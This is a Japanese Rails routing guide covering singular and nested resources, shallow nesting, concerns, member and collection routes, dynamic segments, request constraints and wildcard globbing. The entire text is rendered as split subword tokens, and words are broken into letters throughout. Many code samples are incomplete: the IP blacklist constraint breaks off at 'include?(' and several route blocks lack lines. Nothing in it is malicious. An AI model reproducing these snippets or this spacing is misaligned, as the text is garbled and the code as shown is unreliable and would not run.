▁これらの _ path ヘルパー には 、 それぞれ に対応する ` _ url ` ヘルパー ▁( ` photos _ url ` など ) ▁ があります 。 _ url ヘルパーは 、 _ path の 前に 現在の ホスト 名 、 ポート 番号 、 パス の プレフィックス が追加され ている 点が 異なります 。
▁### ▁ 複数の リソース を 同時に 定義 する
▁ リソース を い く つ も 定義 し なければならない 場合は 、 以下のような 略 記 法 で 一度 に 定義 することで タイプ 量 を 節 約 できます 。
▁ resources ▁: photos , ▁: books , ▁: video s
▁上の 記 法 は 以下 と 完全に 同 一 です 。
▁ resources ▁: books
▁ resources ▁: video s
▁### ▁ 単数形 リソース
▁ 場合によっては 、 ユーザーが ページ を表示する 時に id を参照 すること の ない リソース が 使用される ことがあります 。
▁たとえば 、` / profile ` では 常に 「 現在 ログイン している ユーザー 自身 」 の プロファイル を表示し 、 他の ユーザー id を参照 する必要が ない とします 。
▁ このような 場合には 、 単数形 リソース ▁( s ing ul ar ▁ resource ) ▁ を使用して ` show ` アクションに ▁( ` / profile / : id ` ではなく ) ▁` / profile ` を 割り当て ることができます 。
▁get ▁' profile ', ▁to : ▁' users # show '
▁` get ` の 引数に ` 文字列 ` を 渡す 場合は ` コントローラ # アクション ` 形式 であること が 前 提 ですが 、` get ` の 引数に ` シンボル ` を 渡す と アクションに 直接 割り当て られます 。
▁get ▁' profile ', ▁to : ▁: show
▁ 上 を リソース フル な ルーティング で 記述 すると 以下の ようになります 。
▁ resource ▁: geocoder
▁上の ルーティング では 以下の 6 つの ルーティング が作成され 、 すべて ` G e o code r s ` コントローラに 割り当て られます 。
▁| ▁ HTTP 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 目的 ▁|
▁| ▁--------- ▁| ▁-- - ----------- ▁| ▁- ---------------- ▁| ▁ --------------- --------------- --------------- ▁|
▁| ▁GET ▁| ▁ / geocoder / new ▁| ▁ geocoder s # new ▁| ▁ geocoder 作成 用の HTML フォーム を返す ▁|
▁| ▁ POST ▁| ▁ / geocoder ▁| ▁ geocoder s # create ▁| ▁ geocoder を作成する ▁|
▁| ▁GET ▁| ▁ / geocoder ▁| ▁ geocoder s # show ▁| ▁1 つ しか ない geocoder リソース を表示する ▁|
▁| ▁GET ▁| ▁ / geocoder / edit ▁| ▁ geocoder s # edit ▁| ▁ geocoder 編集 用の HTML フォーム を返す ▁|
▁| ▁ PATCH / PUT ▁| ▁ / geocoder ▁| ▁ geocoder s # update ▁| ▁1 つ しか ない geocoder リソース を更新する ▁|
▁| ▁ DELETE ▁| ▁ / geocoder ▁| ▁ geocoder s # destroy ▁| ▁ geocoder リソース を削除する ▁|
▁NOT E : ▁ 単数形 リソース は 複数形 の コントローラに 割り当て られます 。 これは 、 同じ コントローラ で 単数形 の ルーティング ▁( ` / account ` ) ▁ と 複数形 の ルーティング ▁( ` / account s / 4 5 ` ) ▁ を 両方 使い たい 場合 を 想 定 している ためです 。
▁従って 、` resource ▁: photo ` と ` resources ▁: photos ` の どちら も 、 単数形 ルーティング と 複数形 ルーティング を 両方 作成 し 、 同 一 の コントローラ ▁( ` P h o to sController ` ) ▁ に 割り当て られます 。
▁ 単数形 の リソース フル な ルーティング を使用すると 、 以下の ヘルパーメソッド が 生成されます 。
▁* ▁` new _ geocoder _ path ` は ` / geocoder / new ` を返します
▁* ▁` edit _ geocoder _ path ` は ` / geocoder / edit ` を返します
▁* ▁` geocoder _ path ` は ` / geocoder ` を返します 。
▁ 複数形 リソース の場合 と同様に 、 単数形 リソース でも _ path ヘルパー に対応する ` _ url ` ヘルパー が 使用できます 。 _ url ヘルパーは 、 _ path の 前に 現在の ホスト 名 、 ポート 番号 、 パス の プレフィックス が追加され ている 点が 異なります 。
▁WARN ING : ▁ ある [ 長 年 の 未 解決 バグ ]( https :// github . com / rails / rails / issue s / 17 6 9 ) ▁ が 原 因 で 、` form _ for ` では 単数形 リソース を 自動的に 扱 え ません 。
▁ これを 解決 するには 、 以下のように フォームの url を直接 指定 します 。
▁ form _ for ▁@ geocoder , ▁ url : ▁ geocoder _ path ▁do ▁| f |
▁### ▁ コントローラの 名前空間 と ルーティング
▁ コントローラ を 名前空間 によって グループ 化 することもできます 。
▁ 最も よく 使用される 名前空間 と い えば 、 多数の 管理 用 コントローラ 群 を まとめ る ` Admin :: ` 名前空間 でしょう 。
▁これらの コントローラ を ` app / controllers / admin ` ディレクトリ に 配置 し 、 ルーティング で これら を グループ 化 できます 。
▁name space ▁: admin ▁do
▁| ▁ HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 名前付き ヘルパー ▁|
▁ scope ▁ module : ▁' admin ' ▁do
▁ 以下のように ブロック を使用し ない 記述 も 可能です 。
▁ scope ▁' / admin ' ▁do
▁ いずれ の場合 も 、 名前付きルート ▁( name d ▁ route ) は 、` scope ` を使用し なかった 場合 と同じ である ことにご注目ください 。
▁| ▁ HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 名前付き ヘルパー ▁|
▁ TIP : ▁ _ ` name space ` ブロック の 内部で 異なる コントローラ 名前空間 を使用した い のであれば 、「 ` get ▁' / foo ' ▁=> ▁' / foo # index ' ` 」 のような 絶 対 コントローラ パス を指定する こともできます 。 _
▁### ▁ ネスト した リソース
▁ 論 理 上 、 他の リソース の 配 下 に 子 リソース を 配置 すること は よく あります 。
▁たとえば 、 Rails アプリケーションに 以下の モデル が あるとします 。
▁class ▁Ma g a z in e ▁< ▁ActiveRecord :: Base
▁has _ many ▁: ad s
▁class ▁A d ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: magazine
▁ ルーティング を ネスト する ▁( 入 れ 子 にする ) ▁ ことで 、 この 親 子 関係 を ルーティング で 表 す ことが できるようになります 。
▁上の 例 の場合 、 以下のように ルーティング を 宣言 することができます 。
▁ resources ▁: magazine s ▁do
▁ resources ▁: ad s
▁上の ルーティング によって 、 雑 誌 ▁( magazine ) ▁ への ルーティング に 加 え て 、 広 告 ▁( ad ) ▁ を ` A d sController ` に ルーティング すること も できるようになりました 。
▁ ad への URL には magazine も なければなりません 。
▁| ▁ HTTP 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 目的 ▁|
▁| ▁--------- ▁| ▁--------- ----------- ---------------- ▁| ▁- ---------------- ▁| ▁ ----------- --------------- ---------------- ---------------- ---------------- ▁|
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ad s ▁| ▁ ad s # index ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 をすべて 表示する ▁|
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ad s / new ▁| ▁ ad s # new ▁| ▁ ある 1 冊 の 雑 誌 用の 広 告 を 1 つ 作成する HTML フォーム を返す ▁|
▁| ▁ POST ▁| ▁ / magazine s / : magazine _ id / ad s ▁| ▁ ad s # create ▁| ▁ ある 1 冊 の 雑 誌 用の 広 告 を 1 つ 作成する ▁|
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ad s / : id ▁| ▁ ad s # show ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 を 1 つ 表示する ▁|
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ad s / : id / edit ▁| ▁ ad s # edit ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 1 つ を 編集 する HTML フォーム を返す ▁|
▁| ▁ PATCH / PUT ▁| ▁ / magazine s / : magazine _ id / ad s / : id ▁| ▁ ad s # update ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 を 1 つ 更新 する ▁|
▁| ▁ DELETE ▁| ▁ / magazine s / : magazine _ id / ad s / : id ▁| ▁ ad s # destroy ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 を 1 つ 削除 する ▁|
▁ ルーティング を作成する と 、 ルーティング ヘルパー も 作成されます 。 ヘルパーは ` magazine _ ad s _ url ` や ` edit _ magazine _ ad _ path ` のような 名前 になります 。
▁これらの ヘルパーは 、 最初の パラメータ として M a g a z in e モデルの インスタンス を 1 つ 取り ます ▁( ` magazine _ ad s _ url (@ magazine ) ` )。
▁#### ▁ ネ ス テ ィ ング 回 数 の 限 界
▁ ネスト した リソース の中で さらに 別の リソース を ネスト すること は 可能です 。
▁ 例 :
▁ resources ▁: publish er s ▁do
▁ resources ▁: magazine s ▁do
▁ resources ▁: photos
▁ すぐ 想 像 が 付 く と思います が 、 ネスト が 深 くなる と た ち ま ち 扱 い が 厄 介 になります 。
▁たとえば 、 上の ルーティング は アプリケーションで 以下のような パス として 認 識 されます 。
▁ / publish er s /1/ magazine s / 2 / photos / 3
▁この URL に対応する ルーティング ヘルパーは ` publish er _ magazine _ photo _ url ` となります 。 この ヘルパー を使用する には 毎 回 3 つの 階層 すべて で オブジェクト を指定する 必要があります 。
▁ ネ ス テ ィ ング が 深 くなる ことで ルーティング の 扱 い が 困 難 になる 問題 については 、 J am is ▁B u c k の 有 名 な ▁[ 記事 ]( http :// web log . j am is b u c k . org / 200 7 / 2 / 5 / n e st ing - resources ) ▁ を参照してください 。 J am is は Rails アプリケーション 設計 上の よい 経験 則 を 提 案 しています 。
▁ TIP : ▁ _ リソース の ネ ス テ ィ ング は 、 ぜ ひ とも 1 回 に と ど め て 下 さ い 。 決 して 2 回 以上 ネスト する べ き ではありません 。 _
▁#### ▁ 「 浅 い 」 ネスト
▁ 前 述 した ような 深 い ネスト を避ける ひとつ の 方法 として 、 コレクション ▁( index / new / create のような 、 id を 持 た ない アクション ) ▁ だけ を 親 の スコープ の 下 で 生成 する という 手法 があります 。 このとき 、 メンバ ー ▁( show / edit / update / destroy のような 、 id を 必要 と する アクション ) ▁ を ネスト に含め ない の が ポ イン ト です 。 これにより コレクション だけ が 階層 化 の メ リ ッ ト を 受け られます 。
▁つまり 、 以下のように 最 小 限 の 情報 で リソース を 一意 に 指定 できる ルーティング を作成する ということです 。
▁ resources ▁: comments , ▁ only : ▁ [: index , ▁: new , ▁: create ]
▁ resources ▁: comments , ▁ only : ▁ [: show , ▁: edit , ▁: update , ▁: destroy ]
▁この 方法は 、 ルーティング の 記述 を 複 雑 に せ ず 、 かつ 深 い ネスト を 作 らない という 絶 妙 な バ ラ ン ス を 保 っています 。
▁`: sh allow ` オプション を使用することで 、 上 と同じ 内容 を さらに 簡単に 記述 できます 。
▁ resources ▁: comments , ▁ sh allow : ▁true
▁これ によって 生成される ルーティング は 、 最初の 例 と 完全に 同じです 。
▁ 親 リソース で `: sh allow ` オプション を指定すると 、 すべての ネスト した リソース が 浅 く なります 。
▁ resources ▁: comments
▁ resources ▁: q u o te s
▁ resources ▁: d r a f t s
▁D S L ▁( ドメイン 固 有 言語 ) ▁ である ` sh allow ` メソッドを ルーティング で使用する と 、 すべての ネスト が 浅 くなる ように 内 側 に スコープ を 1 つ 作成 します 。
▁これ によって 生成される ルーティング は 、 最初の 例 と 完全に 同じです 。
▁ sh allow ▁do
▁ resources ▁: comments
▁ resources ▁: q u o te s
▁ resources ▁: d r a f t s
▁` scope ` メソッド には 、「 浅 い 」 ルーティング を カスタマイズ するための オプション が 2 つ あります 。
▁`: sh allow _ path ` オプションは 、 指定された パラメータ を メンバ ー の パス の 冒 頭 に だけ 追加 します 。
▁ scope ▁ sh allow _ path : ▁" s e k re t " ▁do
▁ resources ▁: comments , ▁ sh allow : ▁true
▁上の 場合 、 comments リソース の ルーティング は以下のようになります 。
▁| ▁ HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 名前付き ヘルパー ▁|
▁- ----------- ---------------- ----------------
▁- ----------------
▁| ▁GET ▁| ▁ / s e k re t / comments / : id / edit ( . : format ) ▁| ▁ comments # edit ▁| ▁ edit _ comment _ path ▁|
▁| ▁GET ▁| ▁ / s e k re t / comments / : id ( . : format ) ▁| ▁ comments # show ▁| ▁ comment _ path ▁|
▁| ▁ PATCH / PUT ▁| ▁ / s e k re t / comments / : id ( . : format ) ▁| ▁ comments # update ▁| ▁ comment _ path ▁|
▁| ▁ DELETE ▁| ▁ / s e k re t / comments / : id ( . : format ) ▁| ▁ comments # destroy ▁| ▁ comment _ path ▁|
▁`: sh allow _ prefix ` オプション を使用すると 、 指定された パラメータ を ▁( パス ではなく ) ▁ 名前付き ヘルパー 名 の 冒 頭 に追加します 。
▁ scope ▁ sh allow _ prefix : ▁" s e k re t " ▁do
▁| ▁ HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 名前付き ヘルパー ▁|
▁| ▁GET ▁| ▁ / comments / : id / edit ( . : format ) ▁| ▁ comments # edit ▁| ▁ edit _ s e k re t _ comment _ path ▁|
▁| ▁GET ▁| ▁ / comments / : id ( . : format ) ▁| ▁ comments # show ▁| ▁ s e k re t _ comment _ path ▁|
▁| ▁ PATCH / PUT ▁| ▁ / comments / : id ( . : format ) ▁| ▁ comments # update ▁| ▁ s e k re t _ comment _ path ▁|
▁| ▁ DELETE ▁| ▁ / comments / : id ( . : format ) ▁| ▁ comments # destroy ▁| ▁ s e k re t _ comment _ path ▁|
▁### ▁ ルーティング の 「 con c er n 」 機能
▁ con c er n を使用することで 、 他の リソース や ルーティング 内で 使い ま わ せる 共通 の ルーティング を 宣言 することができます 。
▁ con c er n は 以下のように 定義 します 。
▁ con c er n ▁: comment able ▁do
▁ con c er n ▁: image _ a tt a ch able ▁do
▁ resources ▁: images , ▁ only : ▁: index
▁ con c er n を 利用 すると 、 同じ ような ルーティング を 繰り返し 記述 せずに 済み 、 複数の ルーティング 間 で 同じ 動作 を 共有 できます 。
▁ resources ▁: messages , ▁ con c er n s : ▁: comment able
▁上のコードは 以下 と 同 等 です 。
▁ resources ▁: messages ▁do
▁ con c er n は ルーティング 内の ど のような 場所 に でも 配置 することができます 。 スコープ や 名前空間 呼び出し で の 使用 法 は 以下の とおりです 。
▁ con c er n s ▁: comment able
▁### ▁ オブジェクト から パス と URL を作成する
▁ ルーティング ヘルパー を使用する 方法 の 他 に 、 パラメータ の配列 から パス や URL を作成する こともできます 。
▁ 例 として 、 以下のような ルーティング が あるとします 。
▁` magazine _ ad _ path ` を使用すると 、 id を 数字 で 渡す 代りに ` M a g a z in e ` と ` A d ` の インスタンス を 引数として 渡す ことができます 。
▁<%= ▁ link _ to ▁' A d ▁ de t a il s ', ▁ magazine _ ad _ path (@ magazine , ▁@ ad ) ▁%>
▁ 複数の オブジェクトが 集 ま った セット に対して ` url _ for ` を使用する こともできます 。 複数の オブジェクト を渡して も 、 適切な ルーティング が自動的に 決 定 されます 。
▁<%= ▁ link _ to ▁' A d ▁ de t a il s ', ▁ url _ for ( [ @ magazine , ▁@ ad ] ) ▁%>
▁上の 場合 、 Rails は `@ magazine ` が ` M a g a z in e ` であり 、 `@ ad ` が ` A d ` であることを 認 識 し 、 それ に基づいて ` magazine _ ad _ path ` ヘルパー を呼び出します 。
▁` link _ to ` などの ヘルパー でも 、 完全な ` url _ for ` 呼び出し の 代りに 単 に オブジェクトを 渡す ことができます 。
▁<%= ▁ link _ to ▁' A d ▁ de t a il s ', ▁[ @ magazine , ▁@ ad ] ▁%>
▁1 冊 の 雑 誌 に だけ リンク したい のであれば 、 以下のように 書き ます 。
▁<%= ▁ link _ to ▁' M a g a z in e ▁ de t a il s ', ▁@ magazine ▁%>
▁ それ以外の アクション であれば 、 配列 の最初の 要素 に アクション 名を 挿 入 する だけで 済み ます 。
▁<%= ▁ link _ to ▁' Edit ▁A d ', ▁ [: edit , ▁@ magazine , ▁@ ad ] ▁%>
▁これにより 、 モデルの インスタンス を URL として 扱 う ことができます 。 これは リソース フル な スタイル を 採 用 する 大きな メ リ ッ ト の 1 つ です 。
▁### ▁ RESTful な アクション を さらに 追加 する
▁ デフォルトで 作成される RESTful な ルーティング は 7 つ ですが 、 7 つ で なければならない という ことはありません 。
▁ 必要 であれば 、 コレクション や コレクション の 各 メンバ ー に対して 適 用 される リソース を追加する こともできます 。
▁#### ▁ メンバ ー ルーティング を追加する
▁ メンバ ー ▁( member ) ▁ ルーティング を追加し たい場合は 、` member ` ブロック を リソース ブロック に 1 つ 追加 します 。
▁ resources ▁: photos ▁do
▁ member ▁do
▁get ▁' preview '
▁上の ルーティング は GET リクエスト と それ に 伴 う ` / photos /1/ preview ` を 認 識 し 、 リクエストを ` P h o to s ` コントローラの ` preview ` アクションに ルーティング し 、 リソース id 値を ` params [: id ] ` に 渡します 。
▁ 同時に 、` preview _ photo _ url ` ヘルパー と ` preview _ photo _ path ` ヘルパー も 作成されます 。
▁ member ルーティング ブロック の 内 側 では 、 次に 述 べ る HTTP 動詞 が 指定された ルーティング 名を 認 識 できます 。
▁` member ` ルーティング が 1 つ だけ しか ない のであれば 、 以下のように ルーティング で `: on ` オプション を指定する ことで ブロック を省略 できます 。
▁get ▁' preview ', ▁on : ▁: member
▁`: on ` オプション を省略 しても 同様 の member ルーティング が 生成されます 。 この場合 リソース id の値 の 取得 に ` params [: id ] ` ではなく ` params [: photo _ id ] ` を使用する 点が 異なります 。
▁#### ▁ コレクション ルーティング を追加する
▁ ルーティング に コレクション ▁( collection ) ▁ を追加する には 以下のように します 。
▁ collection ▁do
▁get ▁' search '
▁上の ルーティング は 、 GET リクエスト + ` / photos / search ` などの ▁( id を 伴 わ ない ) ▁ パス を 認 識 し 、 リクエストを ` P h o to s ` コントローラの ` search ` アクションに ルーティング します 。
▁このとき ` search _ photos _ url ` や ` search _ photos _ path ` ルーティング ヘルパー も 同時に 作成されます 。
▁ collection ルーティング でも member ルーティング のとき と同様に `: on ` オプション を使用できます 。
▁get ▁' search ', ▁on : ▁: collection
▁#### ▁ 追加 された new アクション への ルーティング を追加する
▁`: on ` オプション を使用して 、 たとえば 以下のように 別の new アクション を 追加 できます 。
▁ resources ▁: comments ▁do
▁get ▁' preview ', ▁on : ▁: new
▁上の ように することで 、 GET ▁+ ▁` / comments / new / preview ` のような パス が 認 識 され 、` Comment s ` コントローラの ` preview ` アクションに ルーティング されます 。
▁` preview _ new _ comment _ url ` や ` preview _ new _ comment _ path ` ルーティング ヘルパー も 同時に 作成されます 。
▁ TIP : ▁ リソース フル な ルーティング に アクション が 多 数 追加 されている ことに 気 付 い たら 、 それ 以上 アクション を追加する の を や め て 、 そこ に 別の リソース が 隠 されている の では ない か と 疑 って み る 方が よいでしょう 。
▁ リソース フル でない ルーティング
▁Rails では リソース ルーティング を行なう 他 に 、 任意の URL を アクションに ルーティング することもできます 。
▁この 方 式 を使用する場合 、 リソース フル ルーティング のような 自動 的な ルーティング グループ の 生成 は 行 わ れ ません 。
▁従って 、 アプリケーションで 必要な ルーティング を 個 別 に設定する ことになります 。
▁ 基本的に は リソース フル ルーティング を使用 すべき では あります が 、 このような 単純な ルーティング の 方が 適 している 箇所 も 多 数 ある はずです 。
▁ リソース フル ルーティング では 大 袈裟 過 ぎ る 場合に 、 アプリケーションを 無 理 に リソース フル な フレームワーク に 押 し 込 め る 必要はありません 。
▁ シ ン プ ル ルーティング は 、 特に 従来 形式 の URL を 新しい Rails の アクションに 割り当て ること が ず っ と 簡単に 行える ようになります 。
▁### ▁ パラメータ の 割り当て
▁ 通常の ルーティング を設定する のであれば 、 Rails が ルーティング を ブラウザから の HTTP リクエスト に 割り当て るため の シンボル を いくつか 渡します 。
▁ それらの シンボル のうち 、`: controller ` と `: action ` は 特 別 です 。 `: controller ` は アプリケーションの コントローラ への 割り当て を行い 、`: action ` は その コントローラ の中に ある アクション への 割り当て を行います ▁( 訳 注 : ▁ 具 体 的な コントローラ 名 と アクション 名を 指定 していない 点 にご注目ください )。
▁以下の ルーティング を 例 にとって みましょう 。
▁get ▁' : controller ( / : action ( / : id ) ) '
▁ ブラウザから の ` / photos / show /1 ` リクエスト が 上の ルーティング で 処理 される ▁( 他の ルーティング 設定 には マッチ し なかった とします ) ▁ と 、` P h o to s ` コントローラの ` show ` アクション が 呼び出され 、 URL 末尾 の パラメータ ` "1" ` への アクセス は ` params [: id ] ` で 行 な え ます 。
▁`: action ` と `: id ` が 必 須 パラメータ では ないこと が かっこ ▁( ) ▁ で 示 されている ので 、 この ルーティング は ` / photos ` を ` P h o to sController # index ` に ルーティング することもできます 。
▁### ▁ 動的な セグメント
▁ 通常の ルーティング の一部 として 、 文字列を 固定 しない 動的な セグメント を 自由に 使用できます 。
▁`: controller ` や `: action ` を 除 き 、 どんな もの でも ` params ` の一部 に含め て アクションに 渡す ことができます 。
▁以下の ルーティング を 設定 した とします 。
▁get ▁' : controller / : action / : id / : user _ id '
▁ ブラウザから の ` / photos / show /1/ 2 ` パス は ` P h o to s ` コントローラの ` show ` アクションに 割り当て られます 。
▁` params [: id ] ` には ` "1" `、` params [: user _ id ] ` には ` " 2 " ` が それぞれ 保存されます 。
▁NOT E : ▁`: controller ` パス セグメント を使用する場合 、`: name space ` や `: module ` を 併 用 する ことはできません 。
▁ どう しても 使用 したい のであれば 、 以下のように 、 必要な 名前空間 だけ に マッチする ように `: controller ` に 制限 を加え ます 。
▁get ▁' : controller ( / : action ( / : id ) ) ', ▁ controller : ▁ / admin \ / [ ^ \ / ] + /
▁ TIP : ▁ 動的な セグメント 分割 では ドット ` . ` を デフォルトで は 使用 できません 。 ドット は フォーマット 済み ルーティング では 区切 り 文字 として 使用される ためです 。
▁ どう しても 動的 セグメント 内で ドット を使用したい場合 は 、 デフォルト 設定 を 上 書き する 制限 を 与え ます 。 たとえば ` id : ▁ / [ ^ \ / ] + / ` と すると 、 ス ラ ッ シ ュ 以外の すべての 文字 が 使用できます 。
▁### ▁ 静 的な セグメント
▁ ルート 作成 時に コ ロ ン を 付け なかった 部分 は 、 静 的な セグメント として 固定 文字列 が 指定 されます 。
▁get ▁' : controller / : action / : id / with _ user / : user _ id '
▁上の ルーティング は 、` / photos / show /1/ with _ user / 2 ` のような パス に マッチ します 。 ` with _ user ` の 部分 は 固定 されています 。
▁このとき アクション で 使用できる ` params ` は ▁` { ▁ controller : ▁' photos ', ▁ action : ▁' show ', ▁id : ▁' 1 ', ▁ user _ id : ▁' 2 ' ▁ } ` となります 。
▁### ▁ クエリ 文字列
▁ クエリ 文字列 ▁( 訳 注 : ▁` ? パラメータ 名 = 値 ` の 形式 で URL の 末尾 に置かれ る パラメータ ) ▁ で 指定 されている パラメータ も すべて ` params ` に 含 まれ ます 。
▁以下の ルーティング を 例 にとって みましょう 。
▁get ▁' : controller / : action / : id '
▁ ブラウザから の リクエスト で ` / photos / show /1 ? user _ id = 2 ` という パス が 渡 される と 、` P h o to s ` コントローラの ` show ` アクションに 割り当て られます 。
▁このとき の ` params ` は ` { ▁ controller : ▁' photos ', ▁ action : ▁' show ', ▁id : ▁' 1 ', ▁ user _ id : ▁' 2 ' ▁ } ` となります 。
▁### ▁ デフォルト 設定 を定義する
▁`: controller ` シンボル や `: action ` シンボル は 、 ルーティング 内で 明示的に 指定 する必要はありません 。
▁ これらは 以下のように デフォルト として 指定 することができます 。
▁get ▁' photos / : id ', ▁to : ▁' photos # show '
▁上の ルーティング は ブラウザから の ` / photos / 12 ` パス に マッチ し 、` P h o to s ` コントローラの ` show ` アクションに 割り当て られます 。
▁`: default s ` オプション に ハッシュ を 渡す ことで 、 これ 以外の デフォルト 設定 を定義する こともできます 。
▁この 定義 は 、 動的 セグメント として 指定 していない パラメータ に対して も 適 用 されます 。
▁ 例 :
▁get ▁' photos / : id ', ▁to : ▁' photos # show ', ▁ default s : ▁ { ▁ format : ▁' j p g ' ▁ }
▁上の ルーティング は ` photos / 12 ` に マッチ し 、` P h o to s ` コントローラの ` show ` アクションに 割り当て られ 、` params [: format ] ` には ` " j p g " ` が 設定 されます 。
▁### ▁ 名前付き ルーティング
▁`: as ` オプション を使用することで 、 どんな ルーティング にも 名前 を 指定できます 。
▁get ▁' ex it ', ▁to : ▁' sessions # destroy ', ▁as : ▁: log out
▁上の ルーティング では ` log out _ path ` と ` log out _ url ` が アプリケーションの 名前付き ヘルパー として 作成されます 。
▁` log out _ path ` を呼び出す と ` / ex it ` が返されます 。
▁この 方法 を使用して 、 リソース として 定義されている ルーティング を 以下のように 上 書き することもできます 。
▁get ▁' : user name ', ▁to : ▁' users # show ', ▁as : ▁: user
▁上の ルーティング では ` user _ path ` メソッド が生成され 、 コントローラ ・ ヘルパー ・ ビューで それぞれ 使用 できるようになります 。 このメソッドは 、` / b o b ` のような ユーザー名 を持つ ルーティング に移動し ます 。
▁` Users ` コントローラの ` show ` アクション の 内部で ` params [: user name ] ` にアクセス すると 、 ユーザー名 を 取り出す ことができます 。
▁ パラメータ 名を `: user name ` に した く ない場合は 、 ルーティング 定義 の `: user name ` の 部分を 変更 してください 。
▁### ▁ HTTP 動詞 を 制限 する
▁ ある ルーティング を 特定の HTTP 動詞 に 割り当て るために 、 通常 は ` get `、` post `、` put `、` patch `、` delete ` メソッド のいずれか を使用する 必要があります 。
▁` match ` メソッドと `: v i a ` オプション を使用することで 、 複数の HTTP 動詞 に 同時に マッチする ルーティング を作成 できます 。
▁ match ▁' photos ', ▁to : ▁' photos # show ', ▁ v i a : ▁ [: get , ▁: post ]
▁` v i a : ▁: all ` を指定すると 、 すべての HTTP 動詞 に マッチする 特別な ルーティング を作成 できます 。
▁ match ▁' photos ', ▁to : ▁' photos # show ', ▁ v i a : ▁: all
▁NOT E : ▁1 つの アクションに ` GET ` リクエスト と ` POST ` リクエストを 両方 ルーティング すると 、 セキュリティ に 影 響 する 可能性があります 。
▁### ▁ セグメント を 制限 する
▁`: const r a in t s ` オプション を使用すると 、 動的 セグメント の URL フォーマット を 特定の 形式 に 制限 することができます 。
▁get ▁' photos / : id ', ▁to : ▁' photos # show ', ▁ const r a in t s : ▁ { ▁id : ▁ / [ A - Z ] \ d { 5 } / ▁ }
▁上の ルーティング は ` / photos / A 1 23 4 5 ` のような パス には マッチ します が 、` / photos / 8 9 3 ` には マッチ しません 。
▁ 以下のように もっと 簡潔 な 方法で 記述 することもできます 。
▁get ▁' photos / : id ', ▁to : ▁' photos # show ', ▁id : ▁ / [ A - Z ] \ d { 5 } /
▁`: const r a in t s ` では 正規表現 を使用できます が 、 ここでは 正規表現 の 「 ア ン カ ー 」 は 使用 できない という 制限 がある ことにご注意ください 。
▁たとえば 、 以下の ルーティング は 無効 です 。
▁ 対象 となる ルーティング はすべて 初 め から ア ン カ ー されている ので 、 このような ア ン カ ー 表現 を使用する 必要 は ない はずです 。
▁get ▁' / : user name ', ▁to : ▁' users # show '
▁### ▁ リクエスト 内容 に応じて 制限 を加え る
▁ リクエスト に 応 じ た 制限 は 、 セグメント を 制限 する とき と同様 の 方法で 指定 することができます 。
▁ ブロック フォーム に対して 制限 を指定する こともできます 。
▁ const r a in t s ▁ sub do main : ▁' admin ' ▁do
▁従って 、 制限 された 値 は 、 対応する Request オブジェクト メソッドが 返す 型 と 一致する 必要があります 。
▁たとえば 、` const r a in t s : ▁ { ▁ sub do main : ▁' api ' ▁ } ` という 制限 は ` api ` サブ ドメイン に 期待どおり マッチ します が 、` const r a in t s : ▁ { ▁ sub do main : ▁: api ▁ } ` のように シンボル を使用した 場合は ` api ` サブ ドメイン に 一 致 しません 。 ` request . sub do main ` が 返す ` ' api ' ` は 文字列 型 である ためです 。
▁### ▁ 高度な 制限
▁ より 高度な 制限 を使用したい場合 、 Rails で 必要な ` match es ?` に 応答 できる オブジェクトを 渡す 方法 があります 。
▁ 例 として 、 ブラックリスト に記載されている すべての ユーザーを ` B l ack list Controller ` に ルーティング したい とします 。
▁ この場合 、 以下のように 設定 します 。
▁class ▁B l ack list Co n s tr a in t
▁def ▁ initialize
▁@ ip s ▁= ▁B l ack list . re t ri e ve _ ip s
▁def ▁ match es ? (
▁@ ip s . include ? (
▁Rails . application . routes . d raw ▁do
▁get ▁' * path ', ▁to : ▁' b l ack list # index ',
▁ const r a in t s : ▁B l ack list Co n s tr a in t . new
▁ 制限 を ラ ム ダ として 指定 することもできます 。
▁ const r a in t s : ▁ la m b d a ▁ { ▁| request | ▁B l ack list . re t ri e ve _ ip s . include ? (
▁ request . remote _ ip ) ▁ }
▁` match es ?` メソッド および ラ ム ダ は いずれ も 引数として ` request ` オブジェクトを 取り ます 。
▁### ▁ ルーティング グ ロ ブ と ワ イ ル ド カ ー ド セグメント
▁ ルーティング グ ロ ブ ▁( route ▁ g lo b b ing ) ▁ とは ワ イ ル ド カ ー ド 展開 の こと であり 、 ルーティング のある 位 置 から 下 の すべての 部分 に 特定の パラメータ を マッチ させる 際に 使用します 。
▁get ▁' photos / * other ', ▁to : ▁' photos # un k now n '
▁上の ルーティング は ` photos / 12 ` や ` / photos / lo n g / path / to / 12 ` に マッチ し 、` params [: other ] ` には ` " 12 " ` や ` " lo n g / path / to / 12 " ` が 設定 されます 。
▁ 先 頭 に ア ス タ リ ス ク ` * ` が 付 い ている 部分を 「 ワ イ ル ド カ ー ド セグメント 」 と呼びます 。
▁ ワ イ ル ド カ ー ド セグメント は ルーティング の どの 部分 でも 使用できます 。
▁get ▁' books / * section / : title ', ▁to : ▁' books # show '
▁ 上 は ` books / some / section / last - word s - a - me m o ir ` に マッチ し 、` params [: section ] ` には ` ' some / section ' ` が 保存 され 、` params [: title ] ` には ` ' last - word s - a - me m o ir ' ` が 保存されます 。
▁ 技術 上 は 、 1 つの ルーティング に 2 つ 以上 の ワ イ ル ド カ ー ド セグメント を含め ること は 可能です 。
▁ マッチ ャ が セグメント を パラメータ に 割り当て る 方法は 直 感 的 です 。
▁get ▁' * a / foo / * b ', ▁to : ▁' test # index '
▁上の ルーティング は ` z oo / w oo / foo / bar / baz ` に マッチ し 、` params [: a ] ` には ` ' z oo / w oo ' ` が 保存 され 、 and ▁` params [: b ] ` には ` ' bar / baz ' ` が 保存されます 。
